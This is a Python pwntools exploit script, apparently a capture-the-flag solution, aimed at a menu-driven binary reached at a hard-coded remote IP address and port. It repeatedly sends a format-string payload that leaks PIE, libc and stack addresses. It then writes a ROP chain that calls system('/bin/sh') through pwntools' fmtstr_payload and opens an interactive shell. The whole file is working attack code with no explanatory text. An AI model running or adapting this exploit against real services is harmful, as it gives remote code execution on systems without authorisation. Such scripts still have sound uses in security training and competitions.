from pwn import *

context.arch = 'amd64'

libc = ELF('./libc.so.6')
e = ELF('./a')

while (1):
    #io = process('./a')
    io = remote('45.153.243.57', 13337)
    sla = io.sendlineafter
    sa = io.sendafter
    sla(b'> ', b'1')
    sa(b': ', b'aaaa'+b'%p;'*((0x100-4)//3)+p8(0x20)+p8(0x80))
    sla(b'>', b'4')
    try:
        a = io.recvuntil(b'Menu:')
    except:
        io.close()
        continue
    if (b'aaaa' not in a):
        io.close()
        continue
    sla(b'>', b'4')
    a = io.recvuntil(b'Menu:').split(b';')
    e.address = int(a[6],16)-0x1406
    libc.address = int(a[44], 16) - 0x29d90
    stack = int(a[48],16)-0x110
    log.info('libc: '+hex(libc.address))
    log.info('pie: '+hex(e.address))
    log.info('stack: '+hex(stack))
    #for i in range(len(a)):
    #    if b'0x7f' in a[i]:
    #        print(i)
    #        print(a[i])
    ws = {
        stack:libc.address+0x000000000002a3e5+1,
        stack+8:libc.address+0x000000000002a3e5
    }
    pl = fmtstr_payload(10, ws)
    sla(b'> ', b'1')
    sa(b': ', pl)
    sla(b'> ', b'2')
    sla(b'> ', b'4')

    ws = {
        stack+0x10:next(libc.search(b'/bin/sh')),
        stack+0x18:libc.sym['system']
    }
    pl = fmtstr_payload(10, ws)
    sla(b'> ', b'1')
    sa(b': ', pl)
    sla(b'> ', b'2')
    sla(b'> ', b'4')
    #sla(b'> ', b'4')
    io.interactive()
    exit(1)